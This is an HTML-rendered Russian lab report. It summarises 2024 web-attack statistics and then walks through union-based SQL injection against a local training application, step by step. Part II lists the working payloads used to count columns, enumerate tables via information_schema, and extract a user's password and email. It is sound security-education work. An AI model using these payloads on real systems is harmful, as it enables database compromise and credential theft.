@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>&Ocy;&tcy;&chcy;&iecy;&tcy; &pcy;&ocy; &lcy;&acy;&bcy;&ocy;&rcy;&acy;&tcy;&ocy;&rcy;&ncy;&ocy;&jcy; &rcy;&acy;&bcy;&ocy;&tcy;&iecy; &numero;1</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <h1 id="отчет-по-лабораторной-работе-1">Отчет по лабораторной работе №1</h1>
+<h1 id="часть-i-исследовательский-отчет-по-веб-уязвимостям">Часть I. Исследовательский отчет по веб-уязвимостям</h1>
+<h2 id="1-введение">1. Введение</h2>
+<p>Целью данного раздела является статистический анализ актуальных угроз в области веб-безопасности за 2024–2025 годы. В отчете сравниваются данные глобального рынка и специфика кибератак на российские организации.</p>
+<h2 id="2-ссылки-на-исследованные-источники">2. Ссылки на исследованные источники</h2>
+<p>Для подготовки отчета использовались данные ведущих экспертных центров:</p>
+<ul>
+<li><strong>ГК «Солар» (Solar MSS)</strong> — <a href="https://rt-solar.ru/analytics/reports/5335/">Отчет о веб-атаках на онлайн-ресурсы российских компаний в 2024 году</a>. Аналитика построена на базе 1,8 млрд событий ИБ, зафиксированных сервисами WAF.</li>
+<li><strong>Verizon Business</strong> — <a href="https://www.verizon.com/business/resources/reports/2024-dbir-data-breach-investigations-report.pdf">2024 Data Breach Investigations Report (DBIR)</a>. Глобальный анализ более 30 000 инцидентов и 10 000 подтвержденных утечек.</li>
+<li><strong>Newsletter Radensa</strong> — <a href="https://newsletter.radensa.ru/archives/6363">Обзор ключевых выводов Verizon DBIR 2024</a>. Аналитический разбор влияния человеческого фактора и эксплуатации уязвимостей на бизнес.</li>
+</ul>
+<hr>
+<h2 id="3-доля-успешных-атак-через-веб-уязвимости">3. Доля успешных атак через веб-уязвимости</h2>
+<h3 id="глобальная-статистика-verizon">Глобальная статистика (Verizon)</h3>
+<p>Согласно отчету <strong>Verizon DBIR 2024</strong>, прямая эксплуатация уязвимостей как способ первоначального проникновения в сеть <strong>выросла почти в 3 раза</strong> по сравнению с предыдущим периодом.</p>
+<ul>
+<li>На текущий момент этот вектор составляет <strong>14% всех подтвержденных утечек</strong> данных.</li>
+<li>Растет сложность цепочек поставок: в <strong>15%</strong> случаев взлом происходил через уязвимости в ПО сторонних производителей (Supply Chain Attack), что на <strong>68% выше</strong> показателей 2023 года.</li>
+</ul>
+<h3 id="российская-статистика-solar-mss">Российская статистика (Solar MSS)</h3>
+<p>В 2024 году в РФ зафиксирован беспрецедентный рост интенсивности атак:</p>
+<ul>
+<li>Общее количество событий ИБ на уровне L7 выросло в <strong>2,4 раза</strong>.</li>
+<li>Злоумышленники максимально автоматизировали процесс: к концу 2024 года доля <strong>сканирований уязвимостей</strong> в общем объеме трафика достигла <strong>77%</strong>.</li>
+<li>Самыми атакуемыми отраслями стали <strong>B2C-сервисы</strong>: почтовые службы, ритейл и грузопассажирские перевозки. Для почтовых сервисов количество атак выросло кратно, достигая пиков в 46 млн событий на одну организацию в месяц.</li>
+</ul>
+<hr>
+<h2 id="4-распределение-по-конкретным-уязвимостям">4. Распределение по конкретным уязвимостям</h2>
+<p>На основе данных <strong>Solar MSS</strong> и <strong>Verizon</strong>, ландшафт уязвимостей распределяется следующим образом:</p>
+<h3 id="41-по-частоте-использования-массовость">4.1. По частоте использования (массовость)</h3>
+<ol>
+<li><strong>Автоматизированные сканеры (77%):</strong> Поиск типовых ошибок конфигурации, открытых панелей администрирования и известных CVE.</li>
+<li><strong>Сложные атаки высокого уровня (до 30%):</strong> Целевые попытки эксплуатации логики веб-приложения (инъекции, обход авторизации).</li>
+<li><strong>Использование ботов (13%):</strong> Применяются для парсинга данных пользователей и массового перебора учетных данных (Credential Stuffing).</li>
+</ol>
+<h3 id="42-по-критичности-и-методам-реализации">4.2. По критичности и методам реализации</h3>
+<ul>
+<li><strong>SQL Injection (SQLi):</strong> Составляют около <strong>6%</strong> от общей массы событий. Несмотря на небольшую долю в общем потоке, остаются критическим вектором, так как ведут к прямой компрометации баз данных.</li>
+<li><strong>Malformed Request Line (до 21%):</strong> Популярный метод в ИТ-отрасли. Заключается в формировании нестандартных HTTP-запросов для обхода сигнатурного анализа WAF.</li>
+<li><strong>Атаки на API и корпоративное ПО:</strong> Количество атак на API выросло в <strong>4 раза</strong>. Доля атак на корпоративные системы (Jira, Confluence, OWA) выросла с <strong>3% до 7%</strong>.</li>
+<li><strong>0-day и скорость реагирования:</strong> Исследование Verizon показало, что злоумышленники начинают массово использовать новые уязвимости через <strong>5 дней</strong> после их раскрытия, в то время как среднее время исправления (Patching) в компаниях составляет около <strong>55 дней</strong>.</li>
+</ul>
+<hr>
+<h2 id="5-выводы">5. Выводы</h2>
+<p>Анализ подтверждает, что веб-уязвимости являются наиболее динамично растущим вектором атак. Если на мировом рынке превалирует эксплуатация критических брешей в корпоративном ПО (например, MOVEit), то в российском сегменте доминирует массовое автоматизированное сканирование и атаки на B2C-сектор с целью дестабилизации сервисов и хищения данных.</p>
+<h2 id="часть-ii-выполнение-заданий-по-sql-инъекциям">Часть II. Выполнение заданий по SQL-инъекциям</h2>
+<h3 id="1-подготовка-и-анализ-среды">1. Подготовка и анализ среды</h3>
+<ul>
+<li>Запущено веб-приложение и база данных через Docker Desktop.</li>
+<li>Приложение доступно по адресу <code>http://localhost:8080/task/</code>.</li>
+<li>Первичная проверка на уязвимость с использованием одиночной кавычки (<code>http://localhost:8080/task/?id=1'</code>) вызвала ошибку синтаксиса MySQL (<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code>), что подтверждает наличие SQL-инъекции в параметре <code>id</code>.</li>
+</ul>
+<h3 id="2-сбор-информации-о-пользователях">2. Сбор информации о пользователях</h3>
+<p>Для выполнения заданий необходимо было сопоставить имена пользователей с их идентификаторами в базе данных. Был проведен ручной перебор параметров <code>id</code> в URL (<code>http://localhost:8080/task/?id=4</code>):</p>
+<ul>
+<li>При <code>id=1</code> был найден пользователь <code>admin</code>.</li>
+<li>В ходе дальнейшего перебора (с 1 по 9) были успешно идентифицированы целевые пользователи:
+<ul>
+<li><strong>ID 9</strong>: Пользователь <code>Volk2</code>.</li>
+<li><strong>ID 4</strong>: Пользователь <code>Vinni-pukh</code>.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="3-классическая-эксплуатация-метод-union-based">3. Классическая эксплуатация: Метод Union-Based</h3>
+<p>После подтверждения уязвимости через ошибку в параметре id, было решено использовать оператор UNION для объединения легитимного запроса с вредоносным.
+Для успешного использования оператора <code>UNION</code> необходимо, чтобы количество столбцов в нашем запросе совпадало с количеством столбцов в оригинальном запросе приложения.</p>
+<ul>
+<li>
+<p><strong>Определение количества столбцов:</strong>
+Используем конструкцию <code>ORDER BY X</code>. При превышении количества существующих столбцов база данных вернет ошибку.</p>
+<ul>
+<li><code>?id=1' order by 1-- -</code> — Страница отображается корректно.</li>
+<li><code>?id=1' order by 2-- -</code> — Страница отображается корректно.</li>
+<li><code>?id=1' order by 3-- -</code> — Страница отображается корректно.</li>
+<li><code>?id=1' order by 4-- -</code> — Ошибка: <code>Unknown column '4' in 'order clause'</code>.</li>
+<li><strong>Вывод:</strong> Исходный запрос выбирает <strong>3 столбца</strong>.</li>
+</ul>
+</li>
+<li>
+<p><strong>Поиск точек вывода данных:</strong>
+Чтобы данные из нашего запроса отобразились на экране, нужно &quot;отключить&quot; вывод основной записи, задав несуществующий ID (например, <code>-1</code>).</p>
+<ul>
+<li><strong>Запрос:</strong> <code>?id=-1' union select 1,2,3-- -</code></li>
+<li><strong>Результат:</strong> На странице вместо данных пользователя отобразились цифры <strong>1</strong> и <strong>2</strong>.</li>
+<li><strong>Вывод:</strong> Для вывода данных мы можем использовать <strong>первый</strong> и <strong>второй</strong> столбцы</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="4-решение-задания-1-поиск-пароля-volk2">4. Решение Задания №1: Поиск пароля Volk2</h3>
+<p><strong>Цель:</strong> Получить пароль пользователя <code>Volk2</code> (ID: 9) из таблицы <code>users</code>.</p>
+<ul>
+<li><strong>Формирование запроса:</strong>
+Поскольку нам доступны 1-я и 2-я позиции, поместим имя во вторую, а пароль в первую.
+<ul>
+<li><strong>URL:</strong> <code>http://localhost:8080/task/?id=-1' union select password,username,3 from users where id=9-- -</code></li>
+</ul>
+</li>
+<li><strong>Результат на странице:</strong>
+<ul>
+<li>В первом поле вывода: <strong><code>Wa spoiuuuuu</code></strong></li>
+<li>Во втором поле вывода: <code>Volk2</code></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="5-решение-задания-2-извлечение-конфиденциальных-данных-почта-vinni-pukh">5. Решение Задания №2: Извлечение конфиденциальных данных (Почта Vinni-pukh)</h3>
+<p><strong>Проблема:</strong> При анализе таблицы <code>users</code> было выявлено, что она содержит только три столбца: <code>id</code>, <code>username</code> и <code>password</code>. Поля для хранения адреса электронной почты в этой таблице нет. Это означает, что данные хранятся в другой таблице в рамках той же базы данных.</p>
+<h4 id="шаг-1-определение-текущей-базы-данных">Шаг 1: Определение текущей базы данных</h4>
+<p>Для начала подтверждаем название текущей схемы (базы данных), чтобы знать, где искать другие таблицы.</p>
+<ul>
+<li><strong>Запрос:</strong> <code>?id=-1' union select database(),2,3-- -</code></li>
+<li><strong>Результат:</strong> <code>security</code></li>
+</ul>
+<h4 id="шаг-2-поиск-всех-таблиц-в-базе-данных-security">Шаг 2: Поиск всех таблиц в базе данных <code>security</code></h4>
+<p>Теперь обратимся к системной таблице <code>information_schema.tables</code>, чтобы увидеть список всех таблиц в нашей БД.</p>
+<ul>
+<li><strong>Запрос:</strong> <code>?id=-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema='security'-- -</code></li>
+<li><strong>Результат:</strong> <code>emails,users</code></li>
+<li><strong>Вывод:</strong> Обнаружена новая таблица <strong><code>emails</code></strong>.</li>
+</ul>
+<h4 id="шаг-3-анализ-структуры-таблицы-emails">Шаг 3: Анализ структуры таблицы <code>emails</code></h4>
+<p>Выясняем названия колонок в найденной таблице, чтобы сформировать точный запрос.</p>
+<ul>
+<li><strong>Запрос:</strong> <code>?id=-1' union select group_concat(column_name),2,3 from information_schema.columns where table_name='emails' and table_schema='security'-- -</code></li>
+<li><strong>Результат:</strong> <code>id,email_id</code></li>
+<li><strong>Вывод:</strong> Почта хранится в колонке <code>email_id</code>.</li>
+</ul>
+<h4 id="шаг-4-извлечение-почты-для-vinni-pukh-id-4">Шаг 4: Извлечение почты для Vinni-pukh (ID: 4)</h4>
+<p>Зная точное имя таблицы и колонки, сопоставляем их с ID нужного нам пользователя.</p>
+<ul>
+<li><strong>Запрос:</strong>
+<code>http://localhost:8080/task/?id=-1' union select email_id,id,3 from emails where id=4-- -</code></li>
+<li><strong>Результат на странице:</strong>
+<ul>
+<li>Поле 1 (Email): <strong><code>honey_lover@otus-lab.com</code></strong></li>
+<li>Поле 2 (ID пользователя): <code>4</code></li>
+</ul>
+</li>
+</ul>
+
+            
+            
+        </body>
+        </html>
